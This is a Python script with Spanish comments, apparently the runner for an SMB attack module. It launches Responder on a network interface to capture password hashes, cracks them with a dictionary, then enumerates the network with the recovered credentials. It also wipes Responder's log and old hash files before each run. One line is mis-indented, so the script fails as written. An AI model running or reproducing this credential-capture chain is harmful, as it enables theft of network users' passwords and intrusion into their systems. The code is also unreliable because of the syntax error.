import sys
import os

# Añadir path raíz
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from modules.credential_capture import run_responder
from modules.hash_cracking import crack_hashes
from modules.advanced_enumeration import enumerate_with_credentials

def ejecutar_ataque_smb(interface, dictionary_path):
    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")

    # Limpiar hashes antiguos
    hashes_path = "results/smb/hashes.txt"
    if os.path.exists(hashes_path):
    os.remove(hashes_path)

    responder_log = "/usr/share/responder/Responder.db"
    if os.path.exists(responder_log):
        try:
            os.remove(responder_log)
            print("[*] Log de Responder limpiado.")
        except Exception as e:
            print(f"[!] No se pudo limpiar el log de Responder: {e}")

    # Ejecutar responder
    run_responder(interface)

    hashes_path = "results/smb/hashes.txt"
    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
        print("[-] No se capturaron hashes.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes capturados. Iniciando crackeo...")

    credenciales = crack_hashes(hashes_path, dictionary_path)
    if not credenciales:
        print("[!] No se pudo crackear ningún hash.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes crackeados. Iniciando enumeración avanzada...")
    enumerate_with_credentials(credenciales)

    print("[✓] Módulo SMB finalizado correctamente.")
    input("[*] Pulsa ENTER para cerrar esta terminal.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 smb_runner.py <INTERFAZ> <DICCIONARIO>")
        sys.exit(1)

    interfaz = sys.argv[1]
    diccionario = sys.argv[2]
    ejecutar_ataque_smb(interfaz, diccionario)